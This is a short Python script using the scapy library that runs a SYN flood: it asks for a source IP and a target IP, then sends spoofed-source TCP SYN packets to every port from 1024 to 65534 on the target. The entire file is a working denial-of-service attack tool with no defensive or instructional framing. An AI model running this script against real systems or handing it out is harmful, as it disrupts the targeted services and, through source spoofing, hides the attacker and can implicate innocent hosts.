from scapy.all import *

def synFlood(src,tgt):
    for dport in range(1024,65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=RandShort(), dport=dport, seq=12345, ack=1000, window=1000, flags="S")
        pkt = IPlayer/TCPlayer/"Syn Flood Attack"
        send(pkt)

src = input("[*] Source IP: ")
tgt = input("[*] Target IP: ")
synFlood(src,tgt)